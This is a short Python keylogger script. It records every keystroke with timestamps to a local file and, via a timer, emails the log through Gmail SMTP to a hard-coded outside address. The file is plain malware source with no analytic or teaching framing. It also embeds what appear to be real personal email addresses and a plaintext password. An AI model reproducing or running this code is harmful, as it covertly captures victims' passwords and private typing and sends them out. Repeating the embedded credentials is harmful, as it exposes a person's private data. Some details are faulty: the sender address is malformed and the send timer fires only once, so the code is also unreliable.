import keyboard
import smtplib
from threading import Timer
from datetime import datetime

LOG_FILE = "keylog.txt"
SEND_INTERVAL = 60 # seconds
EMAIL_ADDRESS = "vivekaashyap.com"
EMAIL_PASSWORD = "Vivekaashyap,07"
RECIPIENT_EMAIL = "vivekkashyap8299@gmail.com"

def log_keystroke(event):
    with open(LOG_FILE, "a") as f:
        timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        f.write(f"{timestamp} - {event.name}\n")

keyboard.on_press(log_keystroke)

def send_logs():
    try:
        with open(LOG_FILE, "r") as f:
            logs = f.read()
        
        server = smtplib.SMTP("smtp.gmail.com", 587)
        server.starttls()
        server.login(EMAIL_ADDRESS, EMAIL_PASSWORD)
        
        message = f"Subject: Keylogger Logs\n\n{logs}"
        server.sendmail(EMAIL_ADDRESS, RECIPIENT_EMAIL, message)
        
        server.quit()
        
    except Exception as e:
        print(f"Error sending logs: {e}")

timer = Timer(SEND_INTERVAL, send_logs)
timer.start()

keyboard.wait()